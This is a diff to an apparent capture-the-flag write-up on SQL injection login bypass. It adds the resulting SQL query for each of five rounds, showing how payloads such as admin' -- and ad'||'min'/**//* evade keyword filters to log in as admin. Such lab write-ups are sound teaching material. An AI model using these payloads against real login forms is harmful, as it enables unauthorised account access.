@@ -22,6 +22,8 @@ User: `admin' --`
 
 Pass: `123456` (arbitary string)
 
+Our query: `SELECT * FROM users WHERE username='admin' --'  AND password='123'`
+
 ### Round 2:
 
 Filter: `or and like = --`
@@ -31,6 +33,8 @@ Login as admin. Change comment out operator "--" to "/*"
 User: `admin' /*`
 
 Password: `123456` (arbitary string)
+
+Our query: `SELECT * FROM users WHERE username='admin' /*'  AND password='123'`
 
 ### Round 3:
 
@@ -42,6 +46,8 @@ User: `admin'/**//*`
 
 Password: `123456` (arbitary string)
 
+Our query: `SELECT * FROM users WHERE username='admin'/**//*'  AND password='123'`
+
 ### Round 4:
 
 Filter: `or and = like > < -- admin`
@@ -52,6 +58,8 @@ User: `ad'||'min'/**//*`
 
 Pass: `123456` (arbitary string)
 
+Our query: `SELECT * FROM users WHERE username='ad'||'min'/**//*'  AND password='123'`
+
 ### Round 5:
 
 Filter: `or and = like > < -- union admin`
@@ -61,6 +69,8 @@ With **union** filtered, our payload above is not affected.
 User: ad'||'min'/**//*
 
 Pass: `123456` (arbitary string)
+
+Our query: `SELECT * FROM users WHERE username='ad'||'min'/**//*'  AND password='123'`
 
 When you done reaching to 6/5 round. Back to **filter** file and the flag is there !
 
